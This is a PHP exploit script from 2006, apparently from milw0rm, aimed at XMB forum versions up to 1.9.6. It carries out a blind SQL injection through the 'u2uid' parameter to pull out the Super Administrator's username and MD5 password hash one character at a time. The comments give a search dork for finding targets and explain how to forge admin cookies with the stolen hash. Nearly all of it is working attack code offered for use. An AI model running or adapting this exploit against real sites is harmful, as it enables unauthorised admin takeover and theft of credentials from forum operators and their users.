#!/usr/bin/php -q -d short_open_tag=on
<?
echo "XMB <= 1.9.6 'u2uid' SQL injection / admin credentials disclosure\n";
echo "by rgod rgod@autistici.org\n";
echo "site: http://retrogod.altervista.org\n";
echo "dork: \"Powered by XMB\"\n\n";

/*
works with magic_quotes=off
Mysql >= 4.1 (allowing subs)
*/

if ($argc<5) {
echo "Usage: php ".$argv[0]." host path username password OPTIONS\n";
echo "host:      target server (ip/hostname)\n";
echo "path:      path to XMB \n";
echo "user/pass: you need a valid user account\n";
echo "Options:\n";
echo "   -T[prefix]   specify a table prefix (default: xmb_)\r\n";
echo "   -d[delay]       \"   a delay between posts (there is an antiflood protection, default: 5)\r\n";
echo "   -p[port]:       \"   a port other than 80\n";
echo "   -P[ip:port]:    \"   a proxy\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /xmb/ user pass -d6\n";
echo "php ".$argv[0]." localhost /xmb/Files/ user pass -Txmb191_\n";
die;
}

/* software site: http://www.xmbforum.com/

   tested versions:
		   XMB 1.9.3 Final
		   XMB 1.9.4 Final
		   XMB 1.9.5 Final
                   XMB 1.9.6 Alpha

  download page: http://snaps.xmbforum.com/

  vulnerable code in u2u.inc.php near lines 176-219 (code taken from 1.9.5):

  ...
  function u2u_send($u2uid, $msgto, $subject, $message, $u2upreview) {
    global $db, $self, $lang, $username, $SETTINGS, $table_u2u, $del;
    global $u2uheader, $u2ufooter, $u2ucount, $u2uquota;
    global $altbg1, $altbg2, $bordercolor, $borderwidth, $tablespace, $cattext, $thewidth;
    global $forward, $reply;

    global $sendsubmit, $savesubmit, $previewsubmit;

    $username = checkInput($username, '', '', 'script', false);

    if ( $self['ban'] == 'u2u' || $self['ban'] == 'both' ) {
        error( $lang['textbanfromu2u'], false, $u2uheader, $u2ufooter, false, true, false, false );
    }

    if ( $u2ucount >= $u2uquota && $u2uquota > 0 ) {
        error( $lang['u2ureachedquota'], false, $u2uheader, $u2ufooter, false, true, false, false );
    }

    if (isset($savesubmit)) {
        if (empty($subject) || empty($message)) {
            error( $lang['u2uempty'], false, $u2uheader, $u2ufooter, false, true, false, false );
        }

        db_u2u_insert( '', '', 'draft', $self['username'], 'Drafts', $subject, $message, 'yes', 'no' );
        u2u_msg($lang['imsavedmsg'], "u2u.php?folder=Drafts");
    }

    if ( isset( $sendsubmit ) ) {
        $errors = '';
        if ( empty( $subject ) || empty( $message ) ) {
            error( $lang['u2uempty'], false, $u2uheader, $u2ufooter, false, true, false, false );
        }
		// floodcontrol!
		// $SETTINGS['floodctrl']
		if($db->result($db->query("SELECT count(u2uid) FROM $table_u2u WHERE msgfrom='$self[username]' AND dateline > ".(time()-$SETTINGS['floodctrl'])), 0) > 0) {
			error($lang['floodprotect_u2u'], false, $u2uheader, $u2ufooter, false, true, false, false );
		}

        $u2uid = $_POST['u2uid']; // [*]   <------------- this break the global protection

        if ( strstr( $msgto, "," ) && X_STAFF) {
            $errors = u2u_send_multi_recp($msgto, $subject, $message, $u2uid);
        } else {
            $errors = u2u_send_recp($msgto, $subject, $message, $u2uid);
        }
    ...

$u2uid argument is not properly sanitized before to be sent to the u2u_send_recp function:

...
function u2u_send_recp($msgto, $subject, $message, $u2uid=0) {
    global $db, $table_members, $self, $SETTINGS, $lang, $onlinetime, $bbname, $adminemail, $table_u2u, $del;

    $errors = '';

    $query = $db->query( "SELECT username, email, lastvisit, ignoreu2u, emailonu2u, status FROM $table_members WHERE username='" . trim( $msgto ) . "'" );
    if ( $rcpt = $db->fetch_array( $query ) ) {
        $ilist = array_map( 'trim', explode( ",", $rcpt['ignoreu2u'] ) );
        if ( !in_array( $self['username'], $ilist ) || X_ADMIN ) {
            $username = $rcpt['username'];
            db_u2u_insert( $username, $self['username'], 'incoming', $username, 'Inbox', $subject, $message, 'no', 'yes' );
            if ( $self['saveogu2u'] == 'yes' ) {
                db_u2u_insert( $username, $self['username'], 'outgoing', $self['username'], 'Outbox', $subject, $message, 'no', 'yes' );
            }
            //u2u to trash ;)
            if($del == "yes" && $u2uid > 0){
                   $db->query( "UPDATE $table_u2u SET folder='Trash' WHERE u2uid='$u2uid' AND owner='$self[username]'" ); // [**] affected query
            }
...

there is a global protection in xmb.php but [*[ totally break the rules, so,
with magic_quotes_gpc=off, we have sql injection in [**], affected query could become

UPDATE xmb_u2u SET folder='Trash' WHERE u2uid='9999999999' or (1=(SELECT(IF((ASCII(SUBSTRING(password,1,1))=48),1,0)) FROM xmb_members WHERE status='Super Administrator') AND owner='rgod'/*' AND owner='rgod'

because MySQL >= 4.1 allows SELECT subquery.

By sending yourself private messages, trashing them and resend you can
ask true/false questions to the database to extract admin username/password hash pair

you do not need to force the md5 hash, you can set a new cookie like this:

xmbuser=[admin user]; xmbpw=[md5 hash];

to act as admin
									      */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$user=$argv[3];
$pass=$argv[4];
$port=80;
$proxy="";
$prefix="xmb_";
$delay="5";
for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-T")
{
  $prefix=str_replace("-T","",$argv[$i]);
}
if ($temp=="-d")
{
  $delay=str_replace("-d","",$argv[$i]);
}
}

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}

$data ="username=".$user;
$data.="&password=".$pass;
$data.="&profile_user_id=".$profile_user_id;
$data.="&hide=1";
$data.="&secure=yes";
$data.="&loginsubmit=Login";
$packet ="POST ".$path."misc.php?action=login HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
  $temp2=explode(" ",$temp[$i]);
  $temp3=explode("\r",$temp2[0]);
  if (!strstr($temp3[0],";")){$temp3[0]=$temp3[0].";";}
  $cookie.=" ".$temp3[0];
}
if (($cookie=='') | (!strstr($cookie,"xmbuser")) | (!strstr($cookie,"xmbpw"))){echo "Unable to login...";die;}
else {echo "cookie ->".$cookie."\r\n";}

//mqg check...
$sql="999999'";
echo "sql -> ".$sql."\r\n";
$sql=urlencode($sql);
$data ="u2uid=".$sql;
$data.="&msgto=".$user;
$data.="&subject=hello";
$data.="&message=hellohellohello";
$data.="&del=yes";
$data.="&sendsubmit=1";
$packet ="POST ".$path."u2u.php?action=send HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."u2u.php\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep($delay);
if (!strstr($html,"MySQL has encountered an unknown error"))
{
//debug
//echo $html;
die("magic_quotes_gpc On here...");
}
else
{
echo "mqg off, Ok, let's go...\n";}
$packet ="GET ".$path."u2u.php?action=emptytrash HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."u2u.php\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cookie: ".$cookie."\r\n\r\n";
sendpacketii($packet);

$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
//print_r(array_values($md5s));
$j=1;
$password="";
while (!strstr($password,chr(0)))
{
  for ($i=0; $i<=255; $i++)
  {
    if (in_array($i,$md5s))
      {
        $sql="999999'/**/or/**/(1=(SELECT(IF((ASCII(SUBSTRING(password,".$j.",1))=".$i."),1,0))/**/FROM/**/".$prefix."members/**/WHERE/**/status=".my_encode("Super Administrator").") AND owner=".my_encode($user).")/*";
        echo "sql -> ".$sql."\r\n";
        $sql=urlencode($sql);
        $data ="u2uid=".$sql;
        $data.="&msgto=".$user; //send to yourself
        $data.="&subject=hello";
        $data.="&message=hellohellohello";
        $data.="&del=yes";
        $data.="&sendsubmit=1";
        $packet ="POST ".$path."u2u.php?action=send HTTP/1.0\r\n";
        $packet.="Referer: http://".$host.$path."u2u.php\r\n";
        $packet.="Host: ".$host."\r\n";
        $packet.="Connection: Close\r\n";
        $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
        $packet.="Cookie: ".$cookie."\r\n";
        $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
        $packet.=$data;
        sendpacketii($packet);
        sleep($delay);//ah we have an antiflood protection, so wait 5 seconds
        $packet ="GET ".$path."u2u.php?folder=Trash HTTP/1.0\r\n";
        $packet.="Referer: http://".$host.$path."u2u.php\r\n";
        $packet.="Host: ".$host."\r\n";
        $packet.="Connection: Close\r\n";
        $packet.="Cookie: ".$cookie."\r\n\r\n";
        sendpacketii($packet);
        if (strstr($html,"u2uid="))
	{ $password.=chr($i);
	  echo "password -> ".$password."[???]\r\n";
          $packet ="GET ".$path."u2u.php?action=emptytrash HTTP/1.0\r\n";
          $packet.="Referer: http://".$host.$path."u2u.php\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Connection: Close\r\n";
          $packet.="Cookie: ".$cookie."\r\n\r\n";
          sendpacketii($packet);
	  sleep(2);
	  break;
	}

      }
    if ($i==255) {die("Exploit failed...");}
    }
  $j++;
}
$packet ="GET ".$path."u2u.php?action=emptytrash HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."u2u.php\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cookie: ".$cookie."\r\n\r\n";
sendpacketii($packet);

$unused = array('<', '>', '|', '"', '[', ']', '\\', ',', '@', '\'', ' ');
$j=1;
$admin="";
while (!strstr($admin,chr(0)))
{
  for ($i=0; $i<=255; $i++)
  {
    if (!in_array(chr($i),$unused))
    {
        $sql="999999'/**/or/**/(1=(SELECT(IF((ASCII(SUBSTRING(username,".$j.",1))=".$i."),1,0))/**/FROM/**/".$prefix."members/**/WHERE/**/status=".my_encode("Super Administrator").") AND owner=".my_encode($user).")/*";
        echo "sql -> ".$sql."\r\n";
        $sql=urlencode($sql);
        $data ="u2uid=".$sql;
        $data.="&msgto=".$user; //send to yourself
        $data.="&subject=hello";
        $data.="&message=hellohellohello";
        $data.="&del=yes";
        $data.="&sendsubmit=1";
        $packet ="POST ".$path."u2u.php?action=send HTTP/1.0\r\n";
        $packet.="Referer: http://".$host.$path."u2u.php\r\n";
        $packet.="Host: ".$host."\r\n";
        $packet.="Connection: Close\r\n";
        $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
        $packet.="Cookie: ".$cookie."\r\n";
        $packet.="Content-Length: ".strlen($data)."\r\n\r\n";
        $packet.=$data;
        sendpacketii($packet);
        sleep($delay);//ah we have an antiflood protection, so wait 5 seconds
        $packet ="GET ".$path."u2u.php?folder=Trash HTTP/1.0\r\n";
        $packet.="Referer: http://".$host.$path."u2u.php\r\n";
        $packet.="Host: ".$host."\r\n";
        $packet.="Connection: Close\r\n";
        $packet.="Cookie: ".$cookie."\r\n\r\n";
        sendpacketii($packet);
        if (strstr($html,"u2uid="))
	{ $admin.=chr($i);
	  echo "admin -> ".$admin."[???]\r\n";
          $packet ="GET ".$path."u2u.php?action=emptytrash HTTP/1.0\r\n";
          $packet.="Referer: http://".$host.$path."u2u.php\r\n";
          $packet.="Host: ".$host."\r\n";
          $packet.="Connection: Close\r\n";
          $packet.="Cookie: ".$cookie."\r\n\r\n";
          sendpacketii($packet);
	  sleep(2);
	  break;
	}
   }
   if ($i==255) {die("Exploit failed...");}
  }
$j++;
}

echo "--------------------------------------------------------------------\r\n";
echo "admin          -> ".$admin."\r\n";
echo "password (md5) -> ".$password."\r\n";
echo "--------------------------------------------------------------------\r\n";

function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

if (is_hash($password)) {echo "Exploit succeeded...";}
else {echo "Exploit failed...";}

?>

# milw0rm.com [2006-08-01]

